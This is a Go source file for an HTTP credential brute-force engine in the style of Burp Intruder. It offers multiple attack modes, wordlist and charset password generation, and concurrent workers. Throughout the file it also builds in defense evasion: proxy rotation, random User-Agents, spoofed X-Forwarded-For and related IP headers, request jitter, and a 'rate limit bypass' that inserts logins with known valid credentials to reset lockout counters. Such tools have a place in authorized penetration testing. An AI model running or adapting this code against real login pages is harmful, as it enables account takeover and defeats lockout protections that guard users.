package proxy

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"math/rand"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

type AttackConfig struct {
	Method       string // "GET", "POST", etc.
	TargetURL    string
	Username     string
	Wordlist     string
	UserField    string // default "username"
	PassField    string // default "password"
	SuccessRegex string // optional regex to check in response body
	OriginalBody string // To store the original intercepted HTTP body
	Headers      map[string]string // Original request headers
	Concurrency  int    // number of workers
	IsJSON       bool   // if true, send as JSON instead of form-urlencoded
	DelayMs      int    // Delay between each request
	BatchSize    int    // Number of requests before a longer batch delay
	BatchDelayMs int    // Longer delay after BatchSize requests
	ExpectedStatus int  // Status code to check
	StatusIsSuccess bool // True: ExpectedStatus means success; False: ExpectedStatus means failure
	GenCharset     string // Characters to use if wordlist is empty
	GenMaxLen      int    // Max length for generated passwords
	ProxyList      string // Path to proxy list file
	RandomUA       bool   // Use random user agents
	RandomIP       bool   // Use random IP headers (X-Forwarded-For)
	ResetCount     int    // Rate limit bypass: inject reset job every N attempts
	ResetUser      string // User to use for reset
	ResetPass      string // Password to use for reset
	AttackType     string // "Sniper", "Battering Ram", "Pitchfork", "Cluster Bomb"
	Wordlist2      string
	GenCharset2    string
	GenMaxLen2     int
	StopOnSuccess  bool
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 1+rand.Intn(254), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

type AttackProgressMsg struct {
	AttemptCount  int
	Password      string
	Status        string // "Running", "Success", "Failed", "Error"
	StatusCode    int
	ContentLength int
	FinalURL      string
	ResponseBody  string
	ErrorMsg      string
	IsReset       bool
}

type attackJob struct {
	payloadMap map[int]string
	username   string
	password   string
	attempt    int
	isReset    bool
}

type attackResult struct {
	password      string
	attempt       int
	success       bool
	statusCode    int
	contentLength int
	err           error
	finalURL      string
	respBody      string
	isReset       bool
}

// ── Template Engine & Helpers ──────────────────────────────────────────

type templatePart struct {
	segments []string
}

func (tp templatePart) reconstruct(globalIndices []int, allPayloads map[int]string) string {
	var sb strings.Builder
	for i, seg := range tp.segments {
		if i%2 == 0 {
			sb.WriteString(seg)
		} else {
			globalIdx := globalIndices[i/2]
			if p, ok := allPayloads[globalIdx]; ok {
				sb.WriteString(p)
			} else {
				sb.WriteString(seg)
			}
		}
	}
	return sb.String()
}

type PlaceholderRef struct {
	PartType     string // "url", "body", "header"
	HeaderKey    string
	LocalIndex   int
	DefaultValue string
}

type TemplateEngine struct {
	URLPart    templatePart
	URLIndices []int

	BodyPart    templatePart
	BodyIndices []int

	HeaderParts   map[string]templatePart
	HeaderIndices map[string][]int

	Placeholders []PlaceholderRef
}

func NewTemplateEngine(targetURL string, headers map[string]string, body string) *TemplateEngine {
	engine := &TemplateEngine{
		HeaderParts:   make(map[string]templatePart),
		HeaderIndices: make(map[string][]int),
	}

	globalCount := 0

	// 1. URL
	urlSegs := strings.Split(targetURL, "§")
	engine.URLPart = templatePart{segments: urlSegs}
	for i := 1; i < len(urlSegs); i += 2 {
		engine.URLIndices = append(engine.URLIndices, globalCount)
		engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
			PartType:     "url",
			LocalIndex:   i,
			DefaultValue: urlSegs[i],
		})
		globalCount++
	}

	// 2. Headers
	var headerKeys []string
	for k := range headers {
		headerKeys = append(headerKeys, k)
	}
	sort.Strings(headerKeys)

	for _, k := range headerKeys {
		v := headers[k]
		if strings.Contains(v, "§") {
			segs := strings.Split(v, "§")
			engine.HeaderParts[k] = templatePart{segments: segs}
			var indices []int
			for i := 1; i < len(segs); i += 2 {
				indices = append(indices, globalCount)
				engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
					PartType:     "header",
					HeaderKey:    k,
					LocalIndex:   i,
					DefaultValue: segs[i],
				})
				globalCount++
			}
			engine.HeaderIndices[k] = indices
		}
	}

	// 3. Body
	bodySegs := strings.Split(body, "§")
	engine.BodyPart = templatePart{segments: bodySegs}
	for i := 1; i < len(bodySegs); i += 2 {
		engine.BodyIndices = append(engine.BodyIndices, globalCount)
		engine.Placeholders = append(engine.Placeholders, PlaceholderRef{
			PartType:     "body",
			LocalIndex:   i,
			DefaultValue: bodySegs[i],
		})
		globalCount++
	}

	return engine
}

func (te *TemplateEngine) Reconstruct(allPayloads map[int]string, headers map[string]string) (string, map[string]string, string) {
	urlStr := te.URLPart.reconstruct(te.URLIndices, allPayloads)

	newHeaders := make(map[string]string)
	for k, v := range headers {
		if part, ok := te.HeaderParts[k]; ok {
			newHeaders[k] = part.reconstruct(te.HeaderIndices[k], allPayloads)
		} else {
			newHeaders[k] = v
		}
	}

	bodyStr := te.BodyPart.reconstruct(te.BodyIndices, allPayloads)

	return urlStr, newHeaders, bodyStr
}

func InjectAutoMarkers(config *AttackConfig) {
	body := config.OriginalBody

	hasMarkers := strings.Contains(config.TargetURL, "§") || strings.Contains(body, "§")
	if !hasMarkers {
		for _, v := range config.Headers {
			if strings.Contains(v, "§") {
				hasMarkers = true
				break
			}
		}
	}
	if hasMarkers {
		return
	}

	method := strings.ToUpper(config.Method)
	isGet := method == "GET" || method == "HEAD"

	if isGet {
		// Inject in TargetURL query parameters
		hasUserParam := false
		hasPassParam := false

		if config.UserField != "[MANUEL]" && config.UserField != "" {
			reForm := regexp.MustCompile(fmt.Sprintf(`([?&]%s)=([^&]*)`, regexp.QuoteMeta(config.UserField)))
			if reForm.MatchString(config.TargetURL) {
				config.TargetURL = reForm.ReplaceAllString(config.TargetURL, fmt.Sprintf("${1}=§${2}§"))
				hasUserParam = true
			}
		}
		if config.PassField != "[MANUEL]" && config.PassField != "" {
			reForm := regexp.MustCompile(fmt.Sprintf(`([?&]%s)=([^&]*)`, regexp.QuoteMeta(config.PassField)))
			if reForm.MatchString(config.TargetURL) {
				config.TargetURL = reForm.ReplaceAllString(config.TargetURL, fmt.Sprintf("${1}=§${2}§"))
				hasPassParam = true
			}
		}

		// If query parameters weren't present in URL, append them
		var appendParts []string
		userVal := config.Username
		if userVal == "" {
			userVal = "admin"
		}
		if !hasUserParam && config.UserField != "[MANUEL]" && config.UserField != "" {
			appendParts = append(appendParts, fmt.Sprintf("%s=§%s§", config.UserField, userVal))
		}
		if !hasPassParam && config.PassField != "[MANUEL]" && config.PassField != "" {
			appendParts = append(appendParts, fmt.Sprintf("%s=§§", config.PassField))
		}

		if len(appendParts) > 0 {
			separator := "?"
			if strings.Contains(config.TargetURL, "?") {
				separator = "&"
			}
			config.TargetURL += separator + strings.Join(appendParts, "&")
		}
	} else {
		// POST / PUT etc: Inject in Body
		if body == "" {
			userVal := config.Username
			if userVal == "" {
				userVal = "admin"
			}

			if config.IsJSON {
				var parts []string
				if config.UserField != "[MANUEL]" && config.UserField != "" {
					parts = append(parts, fmt.Sprintf(`"%s":"§%s§"`, config.UserField, userVal))
				}
				if config.PassField != "[MANUEL]" && config.PassField != "" {
					parts = append(parts, fmt.Sprintf(`"%s":"§§"`, config.PassField))
				}
				if len(parts) > 0 {
					body = "{" + strings.Join(parts, ",") + "}"
				}
			} else {
				var parts []string
				if config.UserField != "[MANUEL]" && config.UserField != "" {
					parts = append(parts, fmt.Sprintf("%s=§%s§", config.UserField, userVal))
				}
				if config.PassField != "[MANUEL]" && config.PassField != "" {
					parts = append(parts, fmt.Sprintf("%s=§§", config.PassField))
				}
				if len(parts) > 0 {
					body = strings.Join(parts, "&")
				}
			}
		} else {
			if config.UserField != "[MANUEL]" && config.UserField != "" {
				reForm := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]*)`, regexp.QuoteMeta(config.UserField)))
				if reForm.MatchString(body) {
					body = reForm.ReplaceAllString(body, fmt.Sprintf("${1}=§${2}§"))
				} else {
					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, regexp.QuoteMeta(config.UserField)))
					body = reJson.ReplaceAllString(body, fmt.Sprintf(`"%s":"§${1}§"`, config.UserField))
				}
			}

			if config.PassField != "[MANUEL]" && config.PassField != "" {
				reForm := regexp.MustCompile(fmt.Sprintf(`(%s)=([^&]*)`, regexp.QuoteMeta(config.PassField)))
				if reForm.MatchString(body) {
					body = reForm.ReplaceAllString(body, fmt.Sprintf("${1}=§${2}§"))
				} else {
					reJson := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, regexp.QuoteMeta(config.PassField)))
					body = reJson.ReplaceAllString(body, fmt.Sprintf(`"%s":"§${1}§"`, config.PassField))
				}
			}
		}
		config.OriginalBody = body
	}
}

func LoadPayloads(wordlist string, charset string, maxLen int) ([]string, error) {
	if strings.HasPrefix(wordlist, "NUM:") {
		rangeStr := strings.TrimPrefix(wordlist, "NUM:")
		stepVal := 1

		rangeParts := strings.Split(rangeStr, ":")
		if len(rangeParts) > 2 {
			return nil, fmt.Errorf("invalid NUM range format: too many colons")
		}
		if len(rangeParts) == 2 {
			stepStr := strings.TrimSpace(rangeParts[1])
			s, err := strconv.Atoi(stepStr)
			if err != nil || s <= 0 {
				return nil, fmt.Errorf("invalid NUM step value: %v", stepStr)
			}
			stepVal = s
			rangeStr = rangeParts[0]
		}

		parts := strings.Split(rangeStr, "-")
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid NUM range format: must be NUM:min-max (e.g., NUM:1-100) or NUM:min-max:step")
		}
		startStr := strings.TrimSpace(parts[0])
		endStr := strings.TrimSpace(parts[1])

		startVal, err := strconv.Atoi(startStr)
		if err != nil {
			return nil, fmt.Errorf("invalid NUM start value: %v", err)
		}
		endVal, err := strconv.Atoi(endStr)
		if err != nil {
			return nil, fmt.Errorf("invalid NUM end value: %v", err)
		}

		width := 0
		if strings.HasPrefix(startStr, "0") && len(startStr) > 1 {
			width = len(startStr)
		} else if strings.HasPrefix(endStr, "0") && len(endStr) > 1 {
			width = len(endStr)
		}

		var list []string
		if startVal <= endVal {
			for i := startVal; i <= endVal; i += stepVal {
				if width > 0 {
					list = append(list, fmt.Sprintf("%0*d", width, i))
				} else {
					list = append(list, fmt.Sprintf("%d", i))
				}
			}
		} else {
			for i := startVal; i >= endVal; i -= stepVal {
				if width > 0 {
					list = append(list, fmt.Sprintf("%0*d", width, i))
				} else {
					list = append(list, fmt.Sprintf("%d", i))
				}
			}
		}
		return list, nil
	}

	if wordlist != "" {
		file, err := os.Open(wordlist)
		if err != nil {
			return nil, err
		}
		defer file.Close()
		var list []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			val := strings.TrimSpace(scanner.Text())
			if val != "" {
				list = append(list, val)
			}
		}
		return list, scanner.Err()
	}

	var list []string
	chars := []rune(charset)
	if len(chars) == 0 {
		return []string{""}, nil
	}
	var generate func(prefix string, length int)
	generate = func(prefix string, length int) {
		if length == 0 {
			list = append(list, prefix)
			return
		}
		for _, c := range chars {
			generate(prefix+string(c), length-1)
		}
	}

	totalEst := 0
	for l := 1; l <= maxLen; l++ {
		term := 1
		for i := 0; i < l; i++ {
			term *= len(chars)
			if term > 100000 {
				break
			}
		}
		totalEst += term
	}
	if totalEst > 100000 {
		maxLen = 3
	}

	for l := 1; l <= maxLen; l++ {
		generate("", l)
	}
	return list, nil
}

func GenerateJobs(engine *TemplateEngine, payloads1 []string, payloads2 []string, attackType string, jobsChan chan<- attackJob, cancelChan <-chan bool) {
	P := len(engine.Placeholders)
	if P == 0 {
		return
	}

	isCancelled := func() bool {
		select {
		case <-cancelChan:
			return true
		default:
			return false
		}
	}

	attemptCount := 0

	switch attackType {
	case "Sniper":
		for j := 0; j < P; j++ {
			for _, p := range payloads1 {
				if isCancelled() {
					return
				}
				attemptCount++
				payloadMap := make(map[int]string)
				payloadMap[j] = p
				jobsChan <- attackJob{
					payloadMap: payloadMap,
					attempt:    attemptCount,
					password:   p,
				}
			}
		}

	case "Battering Ram":
		for _, p := range payloads1 {
			if isCancelled() {
				return
			}
			attemptCount++
			payloadMap := make(map[int]string)
			for j := 0; j < P; j++ {
				payloadMap[j] = p
			}
			jobsChan <- attackJob{
				payloadMap: payloadMap,
				attempt:    attemptCount,
				password:   p,
			}
		}

	case "Pitchfork":
		maxLen := len(payloads1)
		if len(payloads2) < maxLen {
			maxLen = len(payloads2)
		}
		for i := 0; i < maxLen; i++ {
			if isCancelled() {
				return
			}
			attemptCount++
			payloadMap := make(map[int]string)
			var displayParts []string
			for j := 0; j < P; j++ {
				var p string
				if j%2 == 0 {
					p = payloads1[i]
				} else {
					p = payloads2[i]
				}
				payloadMap[j] = p
				displayParts = append(displayParts, p)
			}
			jobsChan <- attackJob{
				payloadMap: payloadMap,
				attempt:    attemptCount,
				password:   strings.Join(displayParts, ", "),
			}
		}

	case "Cluster Bomb":
		assignedSets := make([][]string, P)
		for j := 0; j < P; j++ {
			if j%2 == 0 {
				assignedSets[j] = payloads1
			} else {
				assignedSets[j] = payloads2
			}
			if len(assignedSets[j]) == 0 {
				assignedSets[j] = []string{""}
			}
		}

		var cartesian func(currentMap map[int]string, currentDepth int)
		cartesian = func(currentMap map[int]string, currentDepth int) {
			if isCancelled() {
				return
			}
			if currentDepth == P {
				attemptCount++
				mCopy := make(map[int]string)
				var displayParts []string
				for k := 0; k < P; k++ {
					mCopy[k] = currentMap[k]
					displayParts = append(displayParts, currentMap[k])
				}
				jobsChan <- attackJob{
					payloadMap: mCopy,
					attempt:    attemptCount,
					password:   strings.Join(displayParts, ", "),
				}
				return
			}

			for _, p := range assignedSets[currentDepth] {
				currentMap[currentDepth] = p
				cartesian(currentMap, currentDepth+1)
			}
		}
		cartesian(make(map[int]string), 0)
	}
}

func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, cancelChan <-chan bool) {
	defer close(updateChan)
	// Auto inject username/password markers if not present
	InjectAutoMarkers(&config)

	if config.Concurrency <= 0 {
		config.Concurrency = 1
	}
	if config.GenCharset == "" {
		config.GenCharset = "abcdefghijklmnopqrstuvwxyz0123456789"
	}
	if config.GenMaxLen <= 0 {
		config.GenMaxLen = 4
	}
	if config.GenCharset2 == "" {
		config.GenCharset2 = "abcdefghijklmnopqrstuvwxyz0123456789"
	}
	if config.GenMaxLen2 <= 0 {
		config.GenMaxLen2 = 4
	}
	if config.AttackType == "" {
		config.AttackType = "Sniper"
	}

	var err error
	var successRegex *regexp.Regexp
	if config.SuccessRegex != "" {
		successRegex, err = regexp.Compile(config.SuccessRegex)
		if err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Invalid Success Regex: %v", err)}
			return
		}
	}

	// 1. Load payload sets
	payloads1, err := LoadPayloads(config.Wordlist, config.GenCharset, config.GenMaxLen)
	if err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error loading Payload Set 1: %v", err)}
		return
	}

	payloads2, err := LoadPayloads(config.Wordlist2, config.GenCharset2, config.GenMaxLen2)
	if err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error loading Payload Set 2: %v", err)}
		return
	}

	// 2. Build template engine
	engine := NewTemplateEngine(config.TargetURL, config.Headers, config.OriginalBody)
	if len(engine.Placeholders) == 0 {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: "No placeholders/markers (§) found in Target URL, Headers, or Request Body."}
		return
	}

	jobs := make(chan attackJob, config.Concurrency)
	results := make(chan attackResult)
	done := make(chan bool)

	localCancel := make(chan bool)
	var cancelOnce sync.Once
	triggerLocalCancel := func() {
		cancelOnce.Do(func() {
			close(localCancel)
		})
	}

	combinedCancel := make(chan bool)
	go func() {
		select {
		case <-cancelChan:
		case <-localCancel:
		}
		close(combinedCancel)
	}()

	var wg sync.WaitGroup

	var proxies []*url.URL
	if config.ProxyList != "" {
		pfile, err := os.Open(config.ProxyList)
		if err == nil {
			ps := bufio.NewScanner(pfile)
			for ps.Scan() {
				if u, err := url.Parse(strings.TrimSpace(ps.Text())); err == nil {
					proxies = append(proxies, u)
				}
			}
			pfile.Close()
		}
	}

	var proxyIndex int
	var pmu sync.Mutex

	transport := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        config.Concurrency * 2,
			IdleConnTimeout:     30 * time.Second,
			MaxIdleConnsPerHost: config.Concurrency * 2,
			DisableKeepAlives:   false,
			Proxy: func(r *http.Request) (*url.URL, error) {
				if len(proxies) == 0 {
					return nil, nil
				}
				pmu.Lock()
				defer pmu.Unlock()
				u := proxies[proxyIndex%len(proxies)]
				proxyIndex++
				return u, nil
			},
		},
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Add default Content-Type headers if needed
	if config.Headers == nil {
		config.Headers = make(map[string]string)
	}
	if _, ok := config.Headers["Content-Type"]; !ok {
		if config.IsJSON {
			config.Headers["Content-Type"] = "application/json"
		} else {
			config.Headers["Content-Type"] = "application/x-www-form-urlencoded"
		}
	}

	for w := 0; w < config.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				select {
				case <-combinedCancel:
					return
				default:
				}

				res := attackResult{
					password: job.password,
					attempt:  job.attempt,
					isReset:  job.isReset,
				}

				var reqURL string
				var reqHeaders map[string]string
				var reqBody string

				if job.isReset {
					// rate limit bypass reset mechanism
					resetPayload := make(map[int]string)
					for j := range engine.Placeholders {
						if j%2 == 0 {
							resetPayload[j] = config.ResetUser
						} else {
							resetPayload[j] = config.ResetPass
						}
					}
					reqURL, reqHeaders, reqBody = engine.Reconstruct(resetPayload, config.Headers)
				} else {
					reqURL, reqHeaders, reqBody = engine.Reconstruct(job.payloadMap, config.Headers)
				}

				success := false
				for retry := 0; retry < 3; retry++ {
					select {
					case <-combinedCancel:
						return
					default:
					}

					method := config.Method
					if method == "" {
						method = "POST"
					}
					req, err := http.NewRequest(method, reqURL, strings.NewReader(reqBody))
					if err != nil {
						res.err = err
						break
					}

					if reqHeaders != nil {
						for k, v := range reqHeaders {
							if strings.ToLower(k) == "host" {
								req.Host = v
							} else {
								req.Header.Set(k, v)
							}
						}
					}

					if config.RandomUA {
						ua := userAgents[time.Now().UnixNano()%int64(len(userAgents))]
						req.Header.Set("User-Agent", ua)
					}
					if config.RandomIP {
						ip := randomIP()
						req.Header.Set("X-Forwarded-For", ip)
						req.Header.Set("X-Real-IP", ip)
						req.Header.Set("Client-IP", ip)
					}

					resp, err := transport.Do(req)
					if err != nil {
						res.err = err
						time.Sleep(100 * time.Millisecond)
						continue
					}

					if resp.StatusCode == 429 {
						resp.Body.Close()
						time.Sleep(5 * time.Second)
						continue
					}

					bodyBytes, _ := io.ReadAll(resp.Body)
					resp.Body.Close()

					res.statusCode = resp.StatusCode
					res.contentLength = len(bodyBytes)

					if !job.isReset {
						res.finalURL = resp.Request.URL.String()

						if config.ExpectedStatus > 0 {
							match := resp.StatusCode == config.ExpectedStatus
							if config.StatusIsSuccess {
								res.success = match
							} else {
								res.success = !match
							}
						} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
							res.success = true
							res.finalURL = resp.Header.Get("Location")
						} else if successRegex != nil {
							if successRegex.Match(bodyBytes) {
								res.success = true
							}
						} else {
							bodyStr := strings.ToLower(string(bodyBytes))
							if resp.StatusCode >= 200 && resp.StatusCode < 300 {
								if !strings.Contains(bodyStr, "incorrect") &&
									!strings.Contains(bodyStr, "invalid") &&
									!strings.Contains(bodyStr, "failed") &&
									!strings.Contains(bodyStr, "hatal") { // hatalı, hatali vs
									res.success = true
								}
							}
						}
					}

					if res.success {
						snippet := strings.TrimSpace(string(bodyBytes))
						if len(snippet) > 80 {
							snippet = snippet[:77] + "..."
						}
						res.respBody = strings.ReplaceAll(snippet, "\n", " ")
					}

					success = true
					break // Successfully processed (win or lose)
				}

				if !success && res.err == nil {
					res.err = fmt.Errorf("failed after retries (rate limited or server error)")
				}

				select {
				case <-combinedCancel:
					return
				case results <- res:
				}

				// Delay logic with Jitter
				if config.DelayMs > 0 {
					jitter := 0
					if config.DelayMs > 10 {
						jitter = (time.Now().Nanosecond() % (config.DelayMs / 5)) - (config.DelayMs / 10)
					}
					select {
					case <-combinedCancel:
						return
					case <-time.After(time.Duration(config.DelayMs+jitter) * time.Millisecond):
					}
				}
				if config.BatchSize > 0 && job.attempt%config.BatchSize == 0 {
					if config.BatchDelayMs > 0 {
						select {
						case <-combinedCancel:
							return
						case <-time.After(time.Duration(config.BatchDelayMs) * time.Millisecond):
						}
					}
				}
			}
		}()
	}

	// Result collector with rate-limiting and block detection
	var finalResult *attackResult
	go func() {
		lastUpdate := time.Now()
		errorCount := 0
		for res := range results {
			if res.err != nil {
				errorCount++
				if errorCount > 50 {
					updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: "Too many errors. Server might be blocking us."}
				}
			} else {
				errorCount = 0
			}

			if res.success && finalResult == nil {
				fr := res
				finalResult = &fr
				if config.StopOnSuccess {
					triggerLocalCancel()
				}
				// Force immediate update to UI on success
				updateChan <- AttackProgressMsg{
					AttemptCount:  res.attempt,
					Password:      res.password,
					Status:        "Running",
					StatusCode:    res.statusCode,
					ContentLength: res.contentLength,
					IsReset:       res.isReset,
				}
			}

			if finalResult == nil && time.Since(lastUpdate) > 100*time.Millisecond {
				updateChan <- AttackProgressMsg{
					AttemptCount:  res.attempt,
					Password:      res.password,
					Status:        "Running",
					StatusCode:    res.statusCode,
					ContentLength: res.contentLength,
					IsReset:       res.isReset,
				}
				lastUpdate = time.Now()
			}
		}
		done <- true
	}()

	// Start jobs generator
	go func() {
		defer close(jobs)
		GenerateJobs(engine, payloads1, payloads2, config.AttackType, jobs, combinedCancel)
	}()

	wg.Wait()
	close(results)
	<-done

	if finalResult != nil {
		updateChan <- AttackProgressMsg{
			AttemptCount: finalResult.attempt,
			Password:     finalResult.password,
			Status:       "Success",
			FinalURL:     finalResult.finalURL,
			ResponseBody: finalResult.respBody,
		}
		return
	}

	updateChan <- AttackProgressMsg{Status: "Failed"}
}

func RunBruteForce(config AttackConfig) {
	updateChan := make(chan AttackProgressMsg)
	cancelChan := make(chan bool)
	go RunBruteForceUI(config, updateChan, cancelChan)

	for msg := range updateChan {
		switch msg.Status {
		case "Running":
			fmt.Printf("\rAttempt %d: Trying %s (Code: %d, Size: %d)", msg.AttemptCount, msg.Password, msg.StatusCode, msg.ContentLength)
		case "Success":
			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", msg.Password)
			return
		case "Failed":
			fmt.Printf("\n[-] Finished. Not found.\n")
			return
		case "Error":
			fmt.Printf("\n[!] Error: %s\n", msg.ErrorMsg)
			return
		}
	}
}


